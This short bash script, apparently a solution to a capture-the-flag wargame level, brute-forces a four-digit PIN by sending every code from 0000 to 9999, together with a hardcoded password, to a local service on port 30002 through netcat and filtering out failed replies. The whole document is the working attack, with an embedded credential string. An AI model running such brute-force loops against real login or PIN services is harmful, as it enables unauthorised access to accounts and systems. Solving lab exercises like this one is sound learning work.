#!/bin/bash

password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for i in {0000..9999}; do
	printf "$password $i\n"
done | nc localhost 30002 | grep -v Wrong

